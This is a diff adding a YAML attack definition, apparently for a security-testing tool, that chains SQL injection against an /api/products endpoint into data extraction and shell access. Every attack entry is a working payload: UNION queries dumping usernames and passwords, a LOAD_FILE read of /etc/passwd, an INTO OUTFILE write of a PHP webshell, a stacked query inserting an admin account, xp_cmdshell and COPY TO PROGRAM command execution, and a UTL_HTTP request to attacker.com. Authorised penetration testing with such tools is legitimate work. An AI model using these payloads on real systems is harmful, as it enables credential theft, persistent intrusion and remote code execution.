@@ -1,0 +1,112 @@
+name: sqli_escalate
+description: SQL injection to data extraction and shell
+
+variables:
+  target_param: id
+  dbms: mysql
+
+steps:
+  - name: detect_sqli
+    request:
+      method: GET
+      url: /api/products
+      params:
+        id: "1' AND '1'='1"
+    expect:
+      status: 200
+
+  - name: confirm_sqli
+    request:
+      method: GET
+      url: /api/products
+      params:
+        id: "1' AND '1'='2"
+    expect:
+      status: [200, 500]
+
+attacks:
+  - name: union_extract_version
+    description: Extract database version
+    type: union_sqli
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1' UNION SELECT NULL,@@version,NULL--"
+
+  - name: union_extract_databases
+    description: Enumerate databases
+    type: union_sqli
+    sequence:
+      - request:
+          method: GET
+          url: /api/products
+          params:
+            id: "1' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--"
+
+  - name: union_extract_tables
+    description: Enumerate tables
+    type: union_sqli
+    sequence:
+      - request:
+          method: GET
+          url: /api/products
+          params:
+            id: "1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
+
+  - name: union_extract_users
+    description: Extract user credentials
+    type: data_extraction
+    sequence:
+      - request:
+          method: GET
+          url: /api/products
+          params:
+            id: "1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--"
+
+  - name: mysql_file_read
+    description: Read files via LOAD_FILE
+    type: file_read
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--"
+
+  - name: mysql_file_write
+    description: Write webshell via INTO OUTFILE
+    type: file_write
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1' UNION SELECT NULL,'<?php system($_GET[\"c\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--"
+
+  - name: time_based_blind
+    description: Time-based blind SQLi
+    type: time_based_sqli
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1' AND SLEEP(5)--"
+
+  - name: stacked_queries
+    description: Execute stacked queries
+    type: stacked_sqli
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1'; INSERT INTO users(username,password,role) VALUES('hacker','hacked','admin');--"
+
+  - name: mssql_xp_cmdshell
+    description: MSSQL xp_cmdshell RCE
+    type: os_command
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1'; EXEC xp_cmdshell 'whoami';--"
+
+  - name: postgres_copy_rce
+    description: PostgreSQL COPY RCE
+    type: os_command
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1'; COPY (SELECT '') TO PROGRAM 'id';--"
+
+  - name: oracle_utl_http
+    description: Oracle UTL_HTTP SSRF
+    type: ssrf_via_sqli
+    modify_step: detect_sqli
+    modifications:
+      params.id: "1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/') FROM DUAL--"
